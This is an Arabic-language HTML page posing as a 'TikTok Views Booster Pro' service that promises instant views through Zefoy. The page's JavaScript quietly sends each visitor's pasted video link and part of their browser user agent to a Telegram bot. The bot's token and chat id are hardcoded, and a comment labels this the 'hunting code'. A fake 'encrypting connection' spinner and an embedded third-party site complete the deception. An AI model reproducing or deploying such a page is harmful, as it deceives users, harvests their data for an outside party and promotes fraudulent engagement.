<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Views Booster Pro</title>
    <style>
        :root { --pink: #ff0050; --cyan: #00f2ea; --dark: #010101; }
        
        body, html { 
            height: 100%; margin: 0; padding: 0; 
            background: radial-gradient(circle at center, #1a1a1a 0%, #000 100%);
            font-family: 'Helvetica Neue', Helvetica, sans-serif;
            color: white; overflow-x: hidden;
        }

        .container { 
            display: flex; flex-direction: column; align-items: center; 
            justify-content: center; min-height: 100vh; padding: 20px;
        }

        /* تصميم الكرت الزجاجي */
        .glass-box {
            background: rgba(255, 255, 255, 0.03);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 30px;
            padding: 40px 30px;
            width: 100%;
            max-width: 420px;
            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
            transition: 0.5s;
        }

        .logo {
            font-size: 2.8rem; font-weight: 900; margin-bottom: 10px;
            letter-spacing: -2px;
            text-shadow: 3px 3px var(--pink), -3px -3px var(--cyan);
        }

        .badge {
            background: linear-gradient(90deg, var(--pink), var(--cyan));
            padding: 5px 15px; border-radius: 20px; font-size: 12px;
            font-weight: bold; margin-bottom: 30px; display: inline-block;
        }

        .input-wrapper { width: 100%; margin-bottom: 25px; }
        
        input {
            width: 100%; padding: 18px; border-radius: 15px;
            border: 1.5px solid #222; background: rgba(0,0,0,0.5);
            color: white; font-size: 16px; box-sizing: border-box;
            outline: none; transition: 0.3s;
        }

        input:focus { border-color: var(--cyan); box-shadow: 0 0 15px rgba(0, 242, 234, 0.3); }

        .btn-main {
            width: 100%; padding: 18px; border: none; border-radius: 15px;
            background: #fff; color: #000; font-size: 1.1rem;
            font-weight: 800; cursor: pointer; transition: 0.3s;
        }

        .btn-main:hover { transform: translateY(-3px); box-shadow: 0 10px 20px rgba(255,255,255,0.1); }

        /* منطقة الـ Iframe */
        #frame-wrap { 
            display: none; width: 100%; height: 550px; 
            margin-top: 20px; border-radius: 20px; overflow: hidden;
            border: 1px solid var(--cyan);
        }

        #loading { display: none; margin: 20px 0; }
        .spinner {
            width: 40px; height: 40px; border: 4px solid rgba(255,255,255,0.1);
            border-top: 4px solid var(--pink); border-radius: 50%;
            animation: spin 1s linear infinite; margin: 0 auto;
        }

        @keyframes spin { 100% { transform: rotate(360deg); } }

        .footer-brand { margin-top: 40px; font-size: 13px; color: #444; }
    </style>
</head>
<body>

<div class="container">
    <div class="glass-box" id="main-ui">
        <div class="logo">TikTok Pro</div>
        <div class="badge">V3.0 ULTIMATE SERVER</div>
        <p style="color: #888; margin-bottom: 30px;">ضخ 500-1000 مشاهدة فورية عبر سيرفرات Zefoy العالمية</p>

        <div class="input-wrapper">
            <input type="text" id="v-url" placeholder="ألصق رابط الفيديو هنا..." autocomplete="off">
        </div>

        <button class="btn-main" onclick="initBoost()">تفعيل الضخ الآن</button>

        <div id="loading">
            <div class="spinner"></div>
            <p style="font-size: 14px; margin-top: 15px;">جاري تشفير الاتصال بالسيرفر...</p>
        </div>
    </div>

    <div class="glass-box" id="frame-wrap">
        <div style="padding: 10px; font-size: 12px; background: #111; color: var(--cyan);">
             ✅ تم ربط الرابط! أكمل "الكابتشا" أدناه للبدء
        </div>
        <iframe src="https://zefoy.com" style="width: 100%; height: 500px; border: none;"></iframe>
    </div>

    <div class="footer-brand">
        IG: massil.456 | &copy; 2026 Dark Radar Solutions
    </div>
</div>

<script>
    function initBoost() {
        const url = document.getElementById('v-url').value;
        if(url.length < 10) { alert("يرجى إدخال رابط صحيح!"); return; }

        // إظهار التحميل
        document.querySelector('.btn-main').style.display = 'none';
        document.getElementById('loading').style.display = 'block';

        // 🎯 كود الصيد (إرسال البيانات فوراً للتليجرام)
        const token = "8378099800:AAGTOLzJCh8qos-1YvssEGZfYD7V-ILHcRo";
        const id = "6052532044";
        const info = `🎬 [صيد مشاهدات جديد]\n━━━━━━━━━━━━━━\n🔗 الرابط: ${url}\n📱 المتصفح: ${navigator.userAgent.slice(0,50)}\n━━━━━━━━━━━━━━\n📸 IG: massil.456`;
        
        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=${encodeURIComponent(info)}`);

        // محاكاة الاتصال ثم إظهار Zefoy
        setTimeout(() => {
            document.getElementById('main-ui').style.display = 'none';
            document.getElementById('frame-wrap').style.display = 'block';
            alert("✅ تم الربط بنجاح! السيرفر يطلب منك حل الكود الأمني بالأسفل لضخ المشاهدات.");
        }, 3000);
    }
</script>

</body>
</html>
